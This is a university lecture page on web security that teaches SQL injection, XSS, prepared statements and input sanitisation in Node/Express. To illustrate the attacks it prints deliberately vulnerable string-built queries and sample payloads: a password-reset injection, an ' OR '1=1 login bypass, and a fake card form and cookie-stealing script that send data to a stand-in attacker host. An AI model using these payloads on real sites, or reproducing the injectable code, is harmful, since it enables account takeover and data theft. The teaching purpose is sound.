<h1>Topic 12: Common Security Issues in Web Development</h1>
</div>
<p>In this final lecture we will look at security issues, including:
<ul>
<li>SQL Injection</li>
<li>Prepared Statements</li>
<li>Cross-Site Scripting and how to prevent it</li>
</ul>
</p>
<h2>Firstly, why security?</h2>
<ul>
<li>Obviously to protect credit card details and passwords</li>
<li>Preventing "spam" on mailing lists or forums</li>
<li>Site vandalism: preventing deletion of legitimate content by unauthorised
users</li>
<li>Confidentiality: many personal details are covered by GDPR</li> 
</ul>
<h2>SQL Injection</h2>
<ul>
<li>A subtle but potentially dangerous security issue</li>
<li>A cracker could potentially enter an SQL query in an HTML form and 
grab confidential data, or even modify or delete a table!</li>
<li>e.g. if we had code such as the following:
<pre>
... connect to database ...
dbconn.query(`select * from details where name='{req.params.name}'`, ...);
</pre>
</li>
<li>If the user entered in the form the following:
<pre>Fred'; UPDATE users SET password='cracked' 
WHERE username='admin</pre>
the query generated would be:
<pre>SELECT * FROM details WHERE name='<em>Fred'; 
UPDATE users SET password='cracked' 
WHERE username='admin</em>'</pre>
with potentially devastating results!!!</li>
</ul>
<h3>Another example</h3>
<ul>
<li>Imagine a login script to a banking site with code such as that below, which displays your card details:
<pre>
dbconn.query(`SELECT * FROM users where password='{req.body.password}' AND username='{req.body.username}'`, [ ], (err, results, fields) =&gt; {
    html = "";
    results.forEach ( result =&gt; {
        html += `Credit card: ${result.creditcard} Expiry date: ${result.expiry}&lt;br /&gt;`;
    });
    res.send(html);
});
</pre>
</li>
<li>and you logged in with:
<pre>
Username: fish' OR '1=1
Password: password
</pre>
</li>
<li>The login script (a standard login script like you did last week) 
will run this
SQL query:
<pre> SELECT * FROM users WHERE password='password' AND username='<em>fish' OR '1=1</em>' </pre>
</li>
<li>This means: 
<em>select all records from the users table where:
    <ul>
    <li>EITHER the password is 'password' AND the username is 'fish' (probably no results!)</li>
    <li>OR 1=1 (which is always true)</li>
    </ul>
</em>
</li>
<li>The second condition (1=1) will always be true so
it will return all records in the users table, including their credit card details!</li>
</ul>
<h3>Using placeholders</h3>
<p>In fact, the technique we have been using makes use of placeholders (?) in our SQL queries, and thus protects against SQL injection, as long as MySQL is in the default configuration. This is secure as it applies escape sequences to characters with special meaning to MySQL in the input data to ensure these SQL injection attacks cannot occur. See <a href='https://www.npmjs.com/package/mysql#escaping-query-values'>here</a> for more details.</p>
<h3>Prepared statements</h3>
<p>Another approach to improving the security of scripts, and guarding against SQL injection attacks, is <em>prepared statements</em>. With prepared statements, he SQL statements are compiled (prepared) into a binary form, which is executed more rapidly by the database, and this binary form is cached and thus can then be re-used, improving the efficiency of your application.</p>
<p>Here is an example of using prepared statements in the mysql2 API. Essentially it's the same approach as normal, but you use <code>execute()</code> rather than <code>query()</code>, and when you have finished with the statement (i.e it won't be executed again), you call <code>unprepare()</code> to free the memory used by it.</p>
<p>See the documentation <a href='https://github.com/sidorares/node-mysql2/blob/master/documentation/Prepared-Statements.md'>here</a>.</p>
<p>An example is below:
<pre>conn.execute("SELECT * FROM songs WHERE artist=?", [req.params.artist],
    (err, results, fields)=&gt; {
        // ...
    }
);</pre>
</p>

<h2>Cross-site scripting (XSS)</h2>
<ul>
<li>A subtle, easily-overlooked, but widely-exploited, security risk with untested input to a web application</li>
<li>Attackers link to your site from <strong>phishing</strong> websites or emails advertising your site</li>
<li>However, their links contain dangerous code embedded within a URL as a parameter</li>
<li>This code can include:
    <ul>
    <li>JavaScript code to perform a harmful action
    such as steal your cookies
    (including your session ID, with the result that someone could 
    access your account)</li>
    <li>Fake HTML hyperlinks or forms</li>
    </ul>
</li>
<li>If your site displays the input (and many sites do),
 your site will be fooled into running the injected code</li>
<li>A very difficult problem to completely eliminate!</li>
</ul>
<h3>Basic, non-harmful XSS example</h3>
<ul>
<li>The usual way in which XSS attacks are done involve injecting harmful JavaScript</li>
<li>This can be done by injecting &lt;script&gt; tags into the site, for example via hidden form fields or parameters within a link</li>
<li>Simple example (not harmful) of a link on a "special offers" site:
<pre>&lt;form method="post" action="https://hittastic.example.com/buy" /&gt;
&lt;input type="hidden" name="id" 
value="<em>1&lt;script&gt;alert('666 I am evil')&lt;/script&gt;</em>" /&gt;
&lt;input type="submit" value="Buy From Hittastic!"/&gt;
&lt;/form&gt;
</li>
<li>If the script sends back the input:
<pre>
res.send(`You have selected the CD with ID ${req.body.id}`);
</pre>
then the script would unwittingly send to the browser the &lt;script&gt; tag stored in the form's hidden field, as it is part of the POST parameter <code>req.body.id</code> (which corresponds to the &lt;input&gt; field with a <code>name</code> of <code>id</code>, i.e. the hidden field). So. it would send 
<pre>You have selected the CD with ID 1&lt;script&gt;alert('666 I am evil')&lt;/script&gt;</pre></li>

<li>...and when the browser receives the &lt;script&gt; tag, it would run the JavaScript inside, because browsers
process all tags returned from the server
</li>
<li>Result: user sees the message "666 I am evil" as a popup in their browser</li>
</ul>
<h3>Fake forms</h3>
<p>A more dangerous example (included in the live demo during the lecture) is injection of a fake HTML form into the genuine site, so that a &lt;form&gt; tag is used in the attack rather than a &lt;script&gt; tag. In this form of attack, the user will be fooled into thinking that the form is provided by the genuine site, and might then enter their credit card details... which will be sent straight back to the attacker!</p>
<p>For example:
<pre>
&lt;input type="hidden" name="id" 
value=<em>"17&lt;form action=http://evilcrackers.example.com/steal.php&gt;Input credit card:
&lt;input name=creditcard /&gt;&lt;/form&gt;"</em> /&gt;
</pre>
</p>
<h3>XSS and Cookie Theft with Embedded JavaScript</h3>
<p>This is an even more dangerous XSS attack, involving embedded JavaScript 
within the links, which could steal user's cookies, including potentially,
session cookies. For example the hidden field could contain this:
<pre>
&lt;input type="hidden" 
name="id" 
value=<em>"123&lt;script&gt;window.location='http://evilcrackers.example.com/stealcookie/' 
+ document.cookie&lt;/script&gt;"</em> /&gt;</pre>
</p>
<ul>
<li>Now the ID contains some embedded JavaScript to set the user's
current web page (window.location) to <code>evilcrackers.example.com/stealcookie</code> and sends user's cookies (accessible in JavaScript using <code>document.cookie</code>) to this URL
</li>
<li>The user will be taken to HitTastic!, but, as the ID is echoed out, the JavaScript will immediately
run (as in the first example) and redirect the user to <code>evilcrackers.example.com</code></li>
<li>The owners of <code`>evilcrackers.example.com/stealcookie</code> 
will then have the session ID and can impersonate the original user by copying the session ID to their own cookies; the genuine website will then think they are the attacked user</li>
<li>If <code>evilcrackers.example.com</code> are really nasty, they could then redirect
the user straight back to HitTastic!, so the user will be unaware of the
entire process</li>
</ul>
<h3>Hidden XSS attacks with URL encoding</h3>
<ul>
<li>Normally the XSS crackers go to greater lengths than the above, to hide
their attack and make it non-obvious</li>
<li>It's possible to encode the <em>entire</em> injected JavaScript as 
<em>URL encoded</em> characters (e.g the letter 'a' would be encoded as %61, its ASCII
code in hexadecimal, or the character '!' would be encoded as %21)</li>
<li>When the user moves over the harmful link, the injected JavaScript would appear 
as the URL-encoded version such as
<pre>%3Cscript%3Ealert%28666%29%3C%2Fscript%3E</pre>
</li>
<li><em>However</em>, the server would decode the URLs (e.g. convert %61 back to 'a')
and treat the injected code as the actual
JavaScript:
<pre>&lt;script&gt;alert(666)&lt;/script&gt;</pre>
meaning the attack still takes place</li>
</ul>
<h3>Guarding against basic XSS attacks: using the Node xss module</h3>
<p>Node makes it easy to guard against XSS attacks using the <code>xss</code> module. With this, you can sanitise any input before it's output again. This invoves replacing characters with special meaning to HTML, such as &lt; and &gt; with their HTML entities, such as &amp;lt; and &amp;gt;. The attack relies on the browser receiving HTML tags in the response, so if these are sanitised, the browser will not interpret them as tags and the attack cannot take place. For example:
<pre>const xss = require('xss');
const express = require('express');
const app = express();
app.get('/', (req, res) =&gt; {
    const sanitised = xss("&lt;script&gt;alert('666 I am evil!');&lt;/script&gt;");
    res.send(sanitised);
});
app.listen(3000);</pre>
If the XSS sanitisation had not occurred, then the HTML
<pre>&lt;script&gt;alert('666 I am evil!');&lt;/script&gt;</pre>
would be sent back to the client, and the browser would execute the JavaScript inside the script tags. However with the use of the <code>xss</code> module, the browser receives instead:
<pre>&amp;lt;script&amp;gt;alert('666 I am evil!');&amp;lt;/script&amp;gt;</pre>
and the browser will not interpret &amp;lt;script&amp;gt; as a script tag, so the attack will not take place.</p>
<p>It's also of note that if you use EJS, this sanitisation takes place automatically when you render (without the need for the <code>xss</code> module), as long as you use &lt;%= rather than &lt;%- to render data.</p>
<h2>Other issues</h2>
<p>There are also other security issues which we will not have time to cover, for example Cross-Site Request Forgery (XSRF). I would recommend reading about these topics in your own time.</p>

<h2>General security, privacy and usability recommendations</h2>
<p>I would like to finish with a few recommendations when developing web applications, to take into account security, privacy and usability. These include:
    <ul>
    <li>Ensure your code is protected from common security attacks, such as SQL injection and XSS. Test your own application and try to deliberately exploit it.</li>
    <li>Ensure that passwords are stored as a hashed (unreadable) form in your database, to prevent them being stolen. You can use Node's <code>bcrypt</code> module for this as we saw <a href='topic7.html#hashing'>in topic 7</a>.</li>
    <li>Use an HTTPS server when dealing with confidential data, including not only login information and card details, but also personal data. HTTPS encrypts confidential data when it is sent from client to server and vice-versa. It's now easy to setup an HTTPS server with <a href='https://letsencrypt.org'>Let's Encrypt</a>.</li>
    <li>Ensure that your application works across common contemporary browsers, including Firefox, Chrome, Edge and Safari. Use only standard web APIs, and not browser-specific extensions. Some web developers do not support Firefox, which can be a great annoyance to users of that browser.</li>
    <li>Ensure you test your site with common ad-blockers, such as uBlock Origin, enabled. Ensure your site works with "Strict" privacy enabled. Ad-blockers and strict privacy levels are used by many users to guard against at best annoying, and at worst dangerous and privacy-invading, invasive popup ads. Morally, if perhaps not legally, core functionality must still work when a user takes these measures.</li>
    </ul>
Unfortunately some web developers ignore the last point in particular, so much so that making payments on certain sites operated by very well-known companies are impossible with ad-blocker enabled.</p>
<h2>Examples for today</h2>
<p>The source code for the live examples can be found <a href='https://github.com/nwcourses/nwcourses.github.io/tree/master/COM518/examples/security'>on GitHub</a>. Note that the phishing site uses PHP and Apache, rather than Node and Express - to highlight the fact that it is an entirely separate site.</p>
